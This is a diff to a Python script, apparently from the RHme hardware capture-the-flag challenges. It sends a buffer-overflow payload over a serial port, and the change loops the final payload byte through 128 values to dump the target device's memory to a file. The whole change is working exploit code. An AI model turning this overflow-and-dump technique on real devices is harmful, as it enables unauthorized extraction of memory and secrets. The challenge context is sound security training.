@@ -7,15 +7,10 @@ from rhme_utilities import *
 #---------------------------------------
 
 # Change this to configure the script
-payloadLength = 22
-fillChar = '\xFF'
-useCustom = True
-firstPart = '\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F'
-configPart = '\x00\x00\x00'
-fillPart = fillChar
-for fill in range(0, 1):
-	fillPart += fillChar
-customCommand = firstPart + configPart + crlf
+fillChar = '\x7F'
+firstPart = '\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F'
+configPart = '\x00'
+customCommand = firstPart + configPart
 
 # Info and Style
 print("")
@@ -44,31 +39,31 @@ def main():
 		temp = serialPort.readline()
 		print(temp.decode())
 
-	# Request reading
-	sendCommand = "R" + crlf
-	serialPort.write(sendCommand.encode())
-	temp = serialPort.readline()
+	# Open file
+	dump = open(r"dumps/test_full_dump", "wb")
 
-	# Perform overflow
-	if useCustom == True:
-		sendCommand = customCommand
-	else:
-		sendCommand = fillChar
-		for fill in range(1, payloadLength):
-			sendCommand += fillChar
-		sendCommand += crlf
-	serialPort.write(sendCommand.encode())
-	# Flush Serial
-	for f in range(0, 4):
+	for loop in range(0x00, 0x80):
+		# Request reading
+		sendCommand = "R" + crlf
+		serialPort.write(sendCommand.encode())
 		temp = serialPort.readline()
 
-	# Dump everything
-	dump = open(r"dumps/dump", "wb")
-	temp = serialPort.read()
-	while temp != b'':
-		dump.write(temp)
+		# Perform overflow
+		sendCommand = customCommand + chr(loop) + crlf
+		print("Dumping loop: " + f'{loop}')
+		serialPort.write(sendCommand.encode())
+		# Flush Serial
+		for f in range(0, 4):
+			temp = serialPort.readline()
+
+		# Dump everything
 		temp = serialPort.read()
-	print("--- Memory Dumped ---")
+		while temp != b'':
+			dump.write(temp)
+			temp = serialPort.read()
+		print("--- Memory Dumped ---")
+
+	# Close File
 	dump.close()
 
 	print("Job's done!")
